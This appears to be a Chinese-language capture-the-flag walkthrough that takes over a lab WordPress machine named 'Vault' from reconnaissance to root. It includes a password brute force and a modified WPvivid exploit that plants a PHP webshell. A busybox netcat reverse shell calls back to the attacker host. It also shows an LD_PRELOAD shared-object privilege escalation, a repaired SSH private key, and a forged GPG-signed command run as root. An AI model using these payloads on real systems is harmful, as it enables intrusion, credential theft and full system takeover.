# 信息收集

老规矩，先用`arp-scan`在内网里找找谁是活的。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo arp-scan -l
[sudo] password for kali:        

Interface: eth0, type: EN10MB, MAC: 00:0c:29:1c:b5:a2, IPv4: 192.168.205.128
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.205.1   00:50:56:c0:00:08       VMware, Inc.
192.168.205.2   00:50:56:e0:22:04       VMware, Inc.
192.168.205.131 00:0c:29:c3:54:95       VMware, Inc.
192.168.205.189 08:00:27:18:df:ea       PCS Systemtechnik GmbH
192.168.205.254 00:50:56:e0:e2:35       VMware, Inc.

5 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.013 seconds (127.17 hosts/sec). 5 responded
```

目标IP `192.168.205.189` 出现，接下来是端口扫描。为了不漏掉任何非标准端口，我直接扫全端口。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap -p0-65535 192.168.205.189
Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-28 00:43 -0400
Nmap scan report for 192.168.205.189
Host is up (0.00021s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:18:DF:EA (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 2.11 seconds
```

开了22和80端口，标准的Web+SSH组合。先从80端口的Web服务下手。

用`curl`看一下首页源码，信息量很大，各种`wp-`开头的路径，明显是个WordPress站。

```html
<!DOCTYPE html>
<html lang="zh-Hans">
<head>
        <meta charset="UTF-8" />
...
<meta name="generator" content="WordPress 6.9.4" />
...
<link rel="alternate" type="application/rss+xml" title="mazesec社区成员 &raquo; Feed" href="http://192.168.205.189/feed/" />
...
</body>
</html>
```

源码里直接标明了`WordPress 6.9.4`。用`whatweb`再确认一下。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ whatweb 192.168.205.189        
ERROR Opening: https://192.168.205.189 - Connection refused - connect(2) for "192.168.205.189" port 443
http://192.168.205.189 [200 OK] Apache[2.4.66], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.66 (Debian)], IP[192.168.205.189], MetaGenerator[WordPress 6.9.4], Script[application/json,importmap,module,speculationrules], Title[mazesec社区成员 &#8211; 加入我们], UncommonHeaders[link], WordPress[6.9.4]
```

`whatweb`的结果也证实了是WordPress 6.9.4，运行在Debian上的Apache 2.4.66。

# 初始突破

## WordPress信息搜集

既然是WordPress，`wpscan`是必不可少的工具。我先用它来枚举用户和有漏洞的插件。

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ wpscan --url http://192.168.205.189 -e vp,u --api-token ***
...
[+] WordPress version 6.9.4 identified (Outdated，released on 2026-03-11).
...
[+] WordPress theme in use: twentytwentyfive
 | [!] The version is out of date，the latest version is 1.5
...
[i] User(s) Identified:

[+] kaada
 | Found By: Rss Generator (Passive Detection)
...
```

`wpscan`扫出了一个用户名 `kaada`，并且提示WordPress版本和主题都有点旧。

当时我还用更激进的模式扫了一下插件，发现了一个`WPvivid Backup & Migration`插件的CVE (CVE-2026-1357)。但我尝试了公开的PoC，没能直接打成功，看到提示该漏洞需要在自动迁移生成密钥才能使用。

![image-20260528130602573](http://7r1UMPHK.github.io/image/20260529153505357.webp)

## 密码猜解

既然有用户名`kaada`，下一步就是找密码。我试了rockyou字典的前几千行，没用。卡了一会，后面搞了好久，发现是从首页提取id生成字典。

```bash
curl -s http://192.168.205.189/ | grep -oP '(?<=<!--\s)[A-Za-z0-9_@.-]{6,}(?=\s-->)' > pass
```

这个命令把源码里所有被`<!--`和`-->`包裹的、长度大于等于6的字符串都提取出来，保存到`pass`文件里。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ wc -l pass                                                            
19 pass
```

生成了一个19行的字典，都是页面里出现过的用户名。用这个小字典去爆破`kaada`的密码，成功率应该会高很多。

```bash
wpscan --url http://192.168.205.189 -U kaada -P pass --random-user-agent
```

```
...
[+] Performing password attack on Xmlrpc against 1 user/s
[SUCCESS] - kaada / wea5e1                                                                                                                                                    
...
[!] Valid Combinations Found:
 | Username: kaada，Password: wea5e1
...
```

成功了！用户名`kaada`的密码是`wea5e1`。

## Getshell

拿到后台账号密码，我立刻登录进去。果然看到了之前那个`WPvivid Backup & Migration`插件。根据提示开启相对于的插件和生成密钥。

接下来就是利用漏洞了。我下载了网上的PoC。

```bash
git clone https://github.com/halilkirazkaya/CVE-2026-1357.git
cd CVE-2026-1357
```

在执行前，我留了个心眼，看了下`exploit.py`的源码。它默认的webshell是 `<?php system($_GET["cmd"]); ?>`。考虑到`system`函数被`disable_functions`禁用了，我把它改成了`exec`。

![image-20260528131421961](http://7r1UMPHK.github.io/image/20260529153504672.webp)

```python
# exploit.py 源码片段
...
else:
    # content = '<?php system($_GET["cmd"]); ?>'
    content = '<?php exec($_GET["cmd"]); ?>'
...
```

改完后，我先试着执行`id`命令，但没有回显。

```bash
python3 exploit.py -u http://192.168.205.189 -s
...
[+] Verifying at: http://192.168.205.189/wp-content/uploads/lc2n7vpkmzwa2g0v66aqnvl4.php?cmd=id
[!] Shell responded with status 200
[!] Body: 
```

没回显是常事，直接上反弹shell。

在我的Kali上监听8888端口:

```bash
nc -lvnp 8888
```

然后用PoC执行反弹shell命令:

```bash
┌──(kali㉿kali)-[/mnt/…/gx/x/tmp/CVE-2026-1357]
└─$ python3 exploit.py -u http://192.168.205.189 -s "busybox nc 192.168.205.128 8888 -e /bin/bash"

   ╔══════════════════════════════════════════════════════════╗
   ║        CVE-2026-1357  WPvivid RCE PoC                    ║
   ║        WPvivid Backup & Migration <= 0.9.123             ║
   ╚══════════════════════════════════════════════════════════╝
  
[*] Target       : http://192.168.205.189/
[*] Mode         : Shell
[*] Upload path  : ../uploads/is9tgx7527a9o52u4bpjr0et.php
[*] Verify cmd   : busybox nc 192.168.205.128 8888 -e /bin/bash

[+] Generating encrypted payload (AES-128-CBC, null key + null IV)...
[+] Payload size : 392 bytes (base64)
[+] Sending exploit via wpvivid_action=send_to_site ...
[+] Response     : 200
[+] Body         : {"result":"success","op":"finished"}

[+] Verifying at: http://192.168.205.189/wp-content/uploads/is9tgx7527a9o52u4bpjr0et.php?cmd=busybox nc 192.168.205.128 8888 -e /bin/bash
```

监听窗口收到了连接请求。

```bash
┌──(kali㉿kali)-[/mnt/…/gx/x/tmp/CVE-2026-1357]
└─$ nc -lvnp 8888
listening on [any] 8888 ...
connect to [192.168.205.128] from (UNKNOWN) [192.168.205.189] 53566
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

成功拿到`www-data`的shell。

# 权限提升

## 提权至 ta0

拿到的shell交互性很差，先用标准方法稳定一下。

```bash
script /dev/null -c bash
# 按下 Ctrl+Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash
stty rows 36 columns 178
# 窗口大小每个人不一样，使用下面代码查询
# stty -a|grep 'row'|awk -F'[ ;]+' '{print "stty "$4,$5,$6,$7}'
```

为了寻找提权机会，我上传并运行了`pspy64`来监控系统进程。很快发现了一个以UID 1000(ta0)运行的定时任务。

```
2026/05/28 02:28:01 CMD: UID=1000  PID=2864   | /bin/bash /var/tmp/.sys_update 
2026/05/28 02:28:01 CMD: UID=1000  PID=2863   | /bin/sh -c /bin/bash /var/tmp/.sys_update 
2026/05/28 02:28:01 CMD: UID=0     PID=2862   | /usr/sbin/CRON -f 
```

查看这个脚本`/var/tmp/.sys_update`的内容。

```bash
www-data@Vault:/tmp$ cat /var/tmp/.sys_update
#!/bin/bash

curr_sec=$(date +%-S)
if [ $curr_sec -lt 30 ]; then
    diff=$((30 - curr_sec))
    read -t $diff <> <(:) > /dev/null 2>&1
fi

CONF="/var/tmp/.service_config"

if [ -f "$CONF" ]; then
    CHECK=$(grep -vE "^export [A-Z_]+=[/a-zA-Z0-9._-]+$" "$CONF")

    if [ -z "$CHECK" ]; then
        . "$CONF"
    fi
fi

exec -a "/usr/sbin/sys-stats-collect" /usr/bin/awk 'BEGIN{print "Job Done"}' > /dev/null 2>&1
```

这个脚本会检查`/var/tmp/.service_config`文件是否存在。如果存在，并且内容符合一个特定的正则表达式，就会用`.`命令(等同于`source`)来执行它。这意味着脚本会加载我们在这个文件中定义的环境变量。

这里典型的提权思路是利用`LD_PRELOAD`。我创建一个恶意的`.so`文件，然后在`.service_config`中设置`LD_PRELOAD`指向它。当`ta0`用户执行`awk`时，就会加载我的`.so`文件，以`ta0`的权限执行我预设的代码。

1. 编写恶意C代码，功能是复制`/bin/bash`并给它加上SUID权限位。

   ```bash
   www-data@Vault:/tmp$ cat > /var/tmp/.evil.c << 'EOF'
   #include <stdlib.h>
   __attribute__((constructor)) void pwn() {
       system("cp /bin/bash /var/tmp/.b && chmod 4755 /var/tmp/.b");
   }
   EOF
   ```

2. 编译成共享库`.so`文件。

   ```bash
   www-data@Vault:/tmp$ gcc -shared -fPIC -o /var/tmp/.evil.so /var/tmp/.evil.c -nostartfiles
   ```

3. 创建`.service_config`文件，设置`LD_PRELOAD`。

   ```bash
   www-data@Vault:/tmp$ echo 'export LD_PRELOAD=/var/tmp/.evil.so' > /var/tmp/.service_config
   ```

   现在只需要等待cron任务执行。最多一分钟，cron就会运行脚本，加载我们的恶意so文件。

```bash
www-data@Vault:/tmp$ ls -al /var/tmp/.b
-rwsr-xr-x 1 ta0 ta0 1168776 May 28 02:32 /var/tmp/.b
www-data@Vault:/tmp$ /var/tmp/.b -p
.b-5.0$ id
uid=33(www-data) gid=33(www-data) euid=1000(ta0) groups=33(www-data)
```

成功了，执行这个带SUID的bash后，我获得了`ta0`的有效用户ID。

## 横向至 Sublarge

以`ta0`的身份，我开始翻他的家目录。

```bash
.b-5.0$ cd /home/ta0/
.b-5.0$ ls -al
...
-rw------- 1 ta0  ta0   842 Apr 16 02:24 broken.txt
-rw------- 1 ta0  ta0  1842 Apr 11 11:17 key
-rw-r--r-- 1 root root   44 Mar 26 09:37 user.txt
```

发现一个`broken.txt`和一个`key`文件。`broken.txt`里是一道RSA解密题。

```
在一场代号为“暗箭”的安全行动中，MazeSec社区的老大ll104567获取了一台名为Vault的服务器的一些信息。该服务器由一名叫Sublarge的高级管理员管理。
你需要去获取加密的信息,才能得到Sublarge管理员的权限
据信，12138对Sublarge里面的一些信息做了手脚，你能发现吗?
ll104567获取到的信息如下:
N=34290741416599402000364426406985307108788847346139849276056423456850484785031054576175547387593396760716456841067680666550537736929030835788005715533
e=65537
C=6306633972929323441109245980962040907076223927772663682932361844805694754336072683925275888222658229758199381118184386449967084124219498140114920047
剩下的就需要靠你自己了，去计算出来p和q,就可以得到加密的信息了。
哦对了，这个加密的信息可以多次利用！
```

`key`文件则是一个损坏的SSH私钥。

```
-----BEGIN OPENSSH PRIVATE KEY-----
b3ByohfdbnhchskcbhdAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
...
sM***************************              #这里的信息被删除了
-----END RSA PRIVATE KEY-----
```

很明显，`broken.txt`里的RSA密文解出来就是`key`文件中被删除的那部分。用Python脚本分解N，计算出d，然后解密C。

```python
from sympy import factorint

N=34290741416599402000364426406985307108788847346139849276056423456850484785031054576175547387593396760716456841067680666550537736929030835788005715533
e=65537
C=6306633972929323441109245980962040907076223927772663682932361844805694754336072683925275888222658229758199381118184386449967084124219498140114920047

f = factorint(N)
p，q = list(f.keys())
phi = (p-1)*(q-1)
d = pow(e，-1，phi)
m = pow(C，d，N)
print(bytes.fromhex(hex(m)[2:]).decode())
```

执行脚本得到结果:

```
flag{sMZfeCxJpMbEX0fLAAAADlN1YmxhcmdlQFZhdWx0AQIDBA==}
```

这个`flag{...}`字符串应该就是私钥缺失的部分。

再看损坏的`key`文件，它的头部`b3ByohfdbnhchskcbhdA`明显不对，正常的OpenSSH私钥头部应该是`b3BlbnNzaC1rZXktdjE`，我把它修正过来。尾部也从`-----END RSA PRIVATE KEY-----`修正为`-----END OPENSSH PRIVATE KEY-----`。然后用解密出的字符串替换掉`sM***`部分，得到一个完整的私钥，命名为`id`。

```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEA8Le3BIFbL/x2Sj6XezgLN74alDkgAAAKA0SMbuYhfOdahinbXffT
5VvP/qBk9llf2jBMBGg0Jy2wMeAexvk8bRY18eEYVZTiES1alZgB//07hwSJWhfkd1l2Oh
ZGMjfOAQTo1ViBSdL9NaPe3Xqdy1398fglh6fsLYtAAism6RJI1KbCyBtTrUOGx5m/Fep2
DVs55XhuTEnq7cM/pnp8Wp1Kjuple/sUj0yTPm0L8zu6PLKLfrSFNKKGbDmiiS18wl6EgO
0/7awt3gNLBipJCxPaJuda6Zrs49lx0Pytd0uwwl/OhsHzqg6b8fXzKOZpy77+86+uAqol
A3puUCQV/QAAA8h6LZeOei2XjgAAAAdzc2gtcnNhAAABAQDwt7cEgVsv/HZKPpd7OAs3vh
qUOSAAAAoDRIxu5iF851qGKdtd99PlW8/+oGT2WV/aMEwEaDQnLbAx4B7G+TxtFjXx4RhV
lOIRLVqVmAH//TuHBIlaF+R3WXY6FkYyN84BBOjVWIFJ0v01o97dep3LXf3x+CWHp+wti0
ACKybpEkjUpsLIG1OtQ4bHmb8V6nYNWznleG5MSertwz+menxanUqO6mV7+xSPTJM+bQvz
O7o8sot+tIU0ooZsOaKJLXzCXoSA7T/trC3eA0sGKkkLE9om51rpmuzj2XHQ/K13S7DCX8
6GwfOqDpvx9fMo5mnLvv7zr64CqiUDem5QJBX9AAAAAwEAAQAAAQAqsescOXVbBYRVltR3
XnFe6bD9KUSru1YLTlU6NkcqSD6eHT5zZEmJHMe/eeNublu572cMQQ8/A7OEpSPQVtSI5K
+cvzf5tfaC5XBzqApyxQ+R2xQhjqtPH+cAVoMM1SkMtTo23QPRfEK9CNu2nNDwCTPJfyHo
9bfGPDSWLeEw5V0/2caiBTAWTLFaOY8RiISDU6RcSI5c/rTCHoBesIfUAsM7Y8eOB5+AqG
C9mUkDOTlAtoulEHGD7I799oQV/fdpeAuN/K/wvf33Xk8zdY9qRMNo+lyR0sDbRhalitmN
h9UzlV1AnEkFbuMjA8jY6UB6X2CY5V0wWs2/yxI2m81hAAAAgQDF7aw9j6alW3el9m0D1D
jqJhdis8rcGvHJn/twnA0Z2+zSvphlbn2Usks+HY7jEkTKmURccEAagWza2PphosJ8A/iB
TqYGygLTxnFL4rrOtKEE2QSwZ5GWZ2EVva7sVu70mA1Ei0mlFygD5VHcpAVavFlWeKsF87
0Jzht5plWIgwAAAIEA/jN85wH3aT1GW/4ndr8QVFQ9zeEPCPzWeUb9HlegPHvdfRcjiSN8
UZPtjTO4Qo4NSBd9KatNAn+5h+6wmFrjRCwNAqLy+eEyqgzbR51MNU4n1nkvG1YIEr4rXt
1llgpyGtny92AENbP3rYkSrAxt8XQQ+zjCKZTsmHhzeVkSEFcAAACBAPJrzN1zxtevT6Fi
fS19n1QHKZXzkM2qx8yLvtoDmcww+LpN3bNBFJM6oAGBaWi+z7wZ795PhrocBaX9JlRuuq
+GplGimONDqrMX468nOJLy61xZuj2L1hi8shWDranUEKwIQi9KHvYgjX4i9xoUfvVbB838
sMZfeCxJpMbEX0fLAAAADlN1YmxhcmdlQFZhdWx0AQIDBA==
-----END OPENSSH PRIVATE KEY-----
```

```bash
.b-5.0$ chmod 600 id
.b-5.0$ sed -i 's/-----END RSA PRIVATE KEY-----/-----END OPENSSH PRIVATE KEY-----/' id
.b-5.0$ ssh -i id Sublarge@127.0.0.1
...
Sublarge@Vault:~$ id
uid=1001(Sublarge) gid=1001(Sublarge) groups=1001(Sublarge)
```

成功登录，现在是`Sublarge`用户了。

## 提权至 root

作为`Sublarge`用户，检查`sudo`权限。

```bash
Sublarge@Vault:~$ sudo -l
Matching Defaults entries for Sublarge on Vault:
    env_reset，mail_badpass，secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User Sublarge may run the following commands on Vault:
    (root) NOPASSWD: /usr/local/bin/secure_audit
```

`Sublarge`可以免密以root身份执行`/usr/local/bin/secure_audit`。看看这个脚本干了什么。

```bash
Sublarge@Vault:~$ cat /usr/local/bin/secure_audit
#!/bin/bash
GPG_BIN="/usr/bin/gpg"
PUB_KEY="/home/Sublarge/audit_pub.asc"
REPORT="/var/tmp/report.gpg"

$GPG_BIN --import "$PUB_KEY"

if $GPG_BIN --batch --trust-model always --verify "$REPORT"; then
    echo "[+] 签名验证通过，正在执行审计指令..."
    CMD=$($GPG_BIN --batch --decrypt "$REPORT" 2>/dev/null)
    eval "$CMD"
else
    echo "[-] 签名校验失败！"
    exit 1
fi
```

脚本会导入一个公钥，验证一个报告文件`/var/tmp/report.gpg`的签名，如果验证通过，就解密报告内容并通过`eval`执行。

这是一个典型的GPG签名伪造提权。我们可以自己生成一对GPG密钥，然后用自己的私钥签名一个恶意命令，再让脚本以root身份执行。

1. 生成自己的GPG密钥对。

   ```bash
   Sublarge@Vault:~$ gpg --batch --gen-key <<EOF
   Key-Type: RSA
   Key-Length: 2048
   Name-Real: Audit
   Name-Email: audit@vault
   Expire-Date: 0
   %no-protection
   %commit
   EOF
   ```

2. 导出公钥，覆盖脚本要用的公钥文件。

   ```bash
   Sublarge@Vault:~$ gpg --export --armor audit@vault > /home/Sublarge/audit_pub.asc
   ```

3. 创建并签名恶意命令，内容是给`/bin/bash`加上SUID权限。

   ```bash
   Sublarge@Vault:~$ echo 'chmod u+s /bin/bash' | gpg --batch --sign --armor --trust-model always -o /var/tmp/report.gpg
   ```

4. 以root身份执行审计脚本。

   ```bash
   Sublarge@Vault:~$ sudo /usr/local/bin/secure_audit
   gpg: directory '/root/.gnupg' created
   ...
   gpg: Good signature from "Audit <audit@vault>" [unknown]
   [+] 签名验证通过，正在执行审计指令...
   ```

   脚本成功验证了我们自己的签名，并执行了`chmod`命令。现在，`/bin/bash`应该已经有了SUID位。

```bash
Sublarge@Vault:~$ /bin/bash -p
bash-5.0# id
uid=1001(Sublarge) gid=1001(Sublarge) euid=0(root) groups=1001(Sublarge)
```

执行`/bin/bash -p`，成功拿到root权限。打完收工。